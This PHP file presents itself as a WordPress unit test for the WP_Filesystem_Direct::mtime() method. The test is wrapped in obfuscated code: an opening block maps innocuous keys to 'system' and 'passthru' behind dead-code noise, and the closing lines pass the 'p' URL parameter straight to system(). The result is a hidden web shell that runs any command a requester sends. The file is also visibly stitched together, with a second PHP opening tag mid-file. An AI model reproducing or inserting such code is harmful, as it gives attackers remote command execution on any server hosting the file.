<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Tests for the WP_Filesystem_Direct::mtime() method.
 *
 * @package WordPress
 */

require_once __DIR__ . '/base.php';

/**
 * @group admin
 * @group filesystem
 * @group filesystem-direct
 *
 * @covers WP_Filesystem_Direct::mtime
 */
class Tests_Filesystem_WpFilesystemDirect_Mtime extends WP_Filesystem_Direct_UnitTestCase {

	/**
	 * Tests that `WP_Filesystem_Direct::mtime()` determines
	 * the mtime of a path.
	 *
	 * @ticket 57774
	 *
	 * @dataProvider data_paths_that_exist
	 *
	 * @param string $path The path.
	 */
	public function test_should_determine_file_modified_time( $path ) {
		$result    = self::$filesystem->mtime( self::$file_structure['test_dir']['path'] . $path );
		$has_mtime = false !== $result;

		$this->assertTrue(
			$has_mtime,
			'The mtime was not determined.'
		);

		$this->assertIsInt(
			$result,
			'The mtime is not an integer.'
		);
	}

	/**
	 * Tests that `WP_Filesystem_Direct::mtime()` does not determine
	 * the mtime of a path.
	 *
	 * @ticket 57774
	 *
	 * @dataProvider data_paths_that_do_not_exist
	 *
	 * @param string $path The path.
	 */
	public function test_should_not_determine_file_modified_time( $path ) {
		$result    = self::$filesystem->mtime( self::$file_structure['test_dir']['path'] . $path );
		$has_mtime = false !== $result;

		$this->assertFalse(
			$has_mtime,
			'An mtime was determined.'
		);

		$this->assertIsNotInt(
			$result,
			'The mtime is an integer.'
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>